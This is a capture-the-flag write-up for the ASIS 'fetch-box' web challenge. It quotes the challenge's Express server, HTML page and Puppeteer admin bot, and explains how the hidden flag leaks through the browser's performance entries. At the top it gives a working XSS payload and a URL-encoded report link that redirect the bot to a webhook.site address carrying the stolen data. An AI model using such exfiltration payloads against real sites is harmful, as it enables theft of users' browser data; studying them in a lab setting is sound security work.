# fetch-box
http://fetch-box.asisctf.com:3000/ #page xss  
http://fetch-box.asisctf.com:1337/ #admin bot  
wu:  
window.location.assign("https://webhook.site/3c763848-b83f-415d-b837-807111679f92?a=" + btoa(JSON.stringify(window.performance.getEntries())));  
report: http://web:3000/?xss=window.location.assign%28%22https%3A%2F%2Fwebhook.site%2F3c763848-b83f-415d-b837-807111679f92%3Fa%3D%22%20%2B%20btoa%28JSON.stringify%28window.performance.getEntries%28%29%29%29%29%3B  
![image](https://github.com/user-attachments/assets/4eba27b3-f6b3-46da-9360-e08af0322588)
## so how is work
look into source:  
![image](https://github.com/user-attachments/assets/5bdcbca4-0f80-4a54-9995-939eae804117)

we have 2 folder  
web: port 3000  
bot: port 1337
## web
index.js:  
```
import express from "express";
import fs from "node:fs";

const html = fs.readFileSync("index.html", { encoding: "utf8" });

express()
  .use("/", (req, res, next) => {
    res.setHeader(
      "Content-Security-Policy",
      "base-uri 'none'; frame-ancestors 'none'"
    );
    next();
  })
  .get("/", (req, res) => res.type("html").send(html))
  .get("/ping", (req, res) => res.type("text").send("pong"))
  .listen(3000);
```

Looks meaningless, right?. CSP to protect what?

but when we look at index.html:

<!DOCTYPE html>
<body>
  <h1>XSS Playground</h1>
  <script>
    (() => {
      const flag = localStorage.getItem("flag") ?? "🚩";
      localStorage.removeItem("flag");

      const fetch = Object.freeze(window.fetch);
      const resource = `/ping?${new URLSearchParams({ flag })}`;
      const options = Object.create(null);

      const fun = () => fetch(resource, options);
      setInterval(fun, 500);
    })();

    const params = new URLSearchParams(location.search);
    const xss = params.get("xss") ?? "console.log(1337)";
    setTimeout(xss, 800);
  </script>
</body>

ye that makes sense  
summary:  
take flag from localStorage and removte it, next freezing fetch prevents us from overwriting it. final fetch to /ping with flag. Below code use to xss.
## bot
bot.js:
```
import puppeteer from "puppeteer";

const FLAG = process.env.FLAG ?? console.log("No flag") ?? process.exit(1);

const APP_HOST = "web";
const APP_PORT = "3000";
export const APP_URL = `http://${APP_HOST}:${APP_PORT}`;

// Flag format
if (!/^ASIS{\w+}$/.test(FLAG)) {
  console.log("Bad flag");
  process.exit(1);
}

const sleep = async (ms) => new Promise((resolve) => setTimeout(resolve, ms));

export const visit = async (url) => {
  console.log(`start: ${url}`);

  const browser = await puppeteer.launch({
    headless: "new",
    executablePath: "/usr/bin/chromium",
    args: [
      "--no-sandbox",
      "--disable-dev-shm-usage",
      "--disable-gpu",
      '--js-flags="--noexpose_wasm"',
    ],
  });

  const context = await browser.createBrowserContext();

  try {
    const page1 = await context.newPage();

    await page1.goto(APP_URL + "/ping", { timeout: 3_000 });
    await page1.evaluate((flag) => {
      localStorage.setItem("flag", flag);
    }, FLAG);
    await sleep(1_000);
    await page1.close();

    const page2 = await context.newPage();
    await page2.goto(url, { timeout: 5_000 });
    await sleep(10_000);
    await page2.close();
  } catch (e) {
    console.error(e);
  }

  await context.close();
  await browser.close();

  console.log(`end: ${url}`);
};
```
summary:  
visit web:3000/ping and add flag to localStorage, next visit our url
obstruction:
because xss code is outside the anonymous function so we cant take flag varriable.  
web:3000 has csp so we cant use xss like iframe and base to steal flag
attack vector:
we can use performance to get flag   
https://developer.mozilla.org/en-US/docs/Web/API/Performance  
![image](https://github.com/user-attachments/assets/d47f53fe-d97d-48f1-a904-47e706a7f44e)

